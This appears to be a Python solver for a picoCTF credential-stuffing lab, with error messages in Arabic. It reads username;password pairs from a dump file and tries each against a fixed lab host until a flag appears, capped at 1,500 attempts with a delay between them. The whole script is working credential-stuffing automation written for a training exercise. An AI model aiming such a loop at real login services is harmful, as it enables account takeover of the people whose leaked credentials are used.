"""Bounded solver for the explicitly named picoCTF Credential Stuffing lab."""
from __future__ import annotations

import re
import socket
import time
from pathlib import Path

TARGET_HOST = "xebec.cylabacademy.net"
TARGET_PORT = 12360
MAX_CREDENTIALS = 1500
ATTEMPT_DELAY = 0.10
CONNECT_TIMEOUT = 2.5
PROMPT_TIMEOUT = 2.5
FLAG_RE = re.compile(r"(?:picoCTF|academy)\{[^{}\r\n]{2,200}\}")


def read_credentials(path: Path) -> tuple[list[tuple[str, str]], int]:
    pairs: list[tuple[str, str]] = []
    malformed = 0
    with path.open("r", encoding="utf-8-sig", errors="replace") as stream:
        for line in stream:
            line = line.strip()
            if not line:
                continue
            parts = line.split(";", 1)
            if len(parts) != 2 or not all(parts):
                malformed += 1
                continue
            pairs.append((parts[0], parts[1]))
            if len(pairs) >= MAX_CREDENTIALS:
                break
    return pairs, malformed


def _receive_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    sock.settimeout(PROMPT_TIMEOUT)
    while len(data) < 8192:
        if marker.lower() in data.lower():
            return bytes(data)
        chunk = sock.recv(1024)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def _receive_response(sock: socket.socket) -> bytes:
    data = bytearray()
    sock.settimeout(PROMPT_TIMEOUT)
    while len(data) < 16384:
        try:
            chunk = sock.recv(2048)
        except socket.timeout:
            break
        if not chunk:
            break
        data.extend(chunk)
        if FLAG_RE.search(data.decode("utf-8", "replace")):
            break
    return bytes(data)


def solve(path: Path, *, connector=socket.create_connection, delay: float = ATTEMPT_DELAY) -> dict:
    """Try only the supplied challenge dump against the fixed picoCTF lab endpoint."""
    if path.name.lower() != "creds-dump.txt":
        return {"ok": False, "error": "اسم الملف المطلوب هو creds-dump.txt."}
    try:
        pairs, malformed = read_credentials(path)
    except OSError as exc:
        return {"ok": False, "error": f"تعذر قراءة الملف المحلي: {exc}", "need": "C:\\Falcon\\analysis\\creds-dump.txt"}
    if not pairs:
        return {"ok": False, "error": "الملف فارغ أو لا يحتوي سجلات بصيغة username;password."}

    attempts = 0
    connect_errors = 0
    for username, password in pairs:
        attempts += 1
        try:
            with connector((TARGET_HOST, TARGET_PORT), timeout=CONNECT_TIMEOUT) as sock:
                greeting = _receive_until(sock, b"Username:")
                if b"username:" not in greeting.lower():
                    return {"ok": False, "attempts": attempts - 1, "entries": len(pairs),
                            "error": "الخدمة لم تعرض مطالبة Username المتوقعة."}
                sock.sendall(username.encode("utf-8") + b"\n")
                prompt = _receive_until(sock, b"Password:")
                if b"password:" not in prompt.lower():
                    return {"ok": False, "attempts": attempts - 1, "entries": len(pairs),
                            "error": "الخدمة لم تعرض مطالبة Password المتوقعة."}
                sock.sendall(password.encode("utf-8") + b"\n")
                response = _receive_response(sock)
                flag_match = FLAG_RE.search((greeting + prompt + response).decode("utf-8", "replace"))
                if flag_match:
                    return {"ok": True, "success": True, "flag": flag_match.group(0),
                            "attempts": attempts, "entries": len(pairs), "malformed": malformed,
                            "target": f"{TARGET_HOST}:{TARGET_PORT}",
                            "username": username}
                connect_errors = 0
        except (OSError, TimeoutError) as exc:
            connect_errors += 1
            if connect_errors >= 3:
                return {"ok": False, "attempts": attempts - 1, "entries": len(pairs),
                        "error": f"انقطع الاتصال بالخدمة بعد محاولات اتصال متتالية: {exc}",
                        "target": f"{TARGET_HOST}:{TARGET_PORT}"}
        if delay > 0:
            time.sleep(delay)
    return {"ok": True, "success": False, "attempts": attempts, "entries": len(pairs),
            "malformed": malformed, "target": f"{TARGET_HOST}:{TARGET_PORT}",
            "error": "لم تُرجع الخدمة علمًا ضمن سجلات الملف."}
